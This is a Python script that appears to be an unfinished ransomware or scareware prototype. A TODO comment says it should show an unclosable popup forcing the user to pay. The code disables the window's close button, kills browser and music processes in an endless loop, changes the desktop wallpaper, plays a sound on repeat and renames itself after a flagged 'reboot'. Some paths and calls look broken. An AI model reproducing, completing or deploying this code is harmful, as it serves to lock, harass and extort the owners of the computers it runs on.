import os
from pathlib import Path
from tkinter import *
PATH = str(Path(__file__).parent.resolve())
def wasRebooted() -> bool:
    try:
        with open("file.txt", "r") as f:
            was_rebooted = f.read().strip() == 'True'
    except Exception:
        was_rebooted = False

    return was_rebooted
wasRebooted()
def startUp():
    if wasRebooted() == True:
        os.rename(str(Path(__file__).absolute()), "costam.py")
        root = Tk()
        root.geometry("500x500")
        root.title("132")
        def disable_event():
            pass
        root.protocol("WM_DELETE_WINDOW", disable_event)
        root.mainloop()


startUp()        

                
"""TODO: 
   -Change the file's picture
   -Create a popup using tkinter, which forces user to pay(User won't be able to exit this popup)
   -If he does, the computer will restart


"""
def kill(listOfPrograms: str | list[str]):
    import psutil
    while True:
        try:
            processes = psutil.process_iter()
            for process in processes:
                try:
                    if type(listOfPrograms) == list:
                        pinfo = process.as_dict(attrs=['name'])
                        if any(program.lower() in pinfo['name'].lower() for program in listOfPrograms):
                            process.terminate()
                            print(f"Success! Killed {pinfo['name']}")
                    else:
                        if listOfPrograms == process.name().lower():
                            process.terminate()
                            print(f"Success! killed {listOfPrograms}")
                except Exception as e:
                        print(f"Error {e}")

        except Exception as e:
            print(f"Error {e}")


def changeWallPaper():
    import ctypes
    if os.path.exists("wallpaper.jpg"):
        ctypes.windll.user32.SystemParametersInfoW(20, 0,  PATH + "\wallpaper.jpg" , 3)
    else:
        print("wallpaper.jpg doesn't exist!")

def playSound():
    from time import sleep
    from playsound import playsound as play
    while True:
        play(PATH + "sound.mp3")
        sleep(1)

def restart():
    #os.system("Shutdown -s -t 1")
    with open('file.txt', 'w') as f:
        f.write('True')


#kill(['brave.exe', 'spotify.exe'])
#changeWallPaper()
#playSound('sound.mp3')

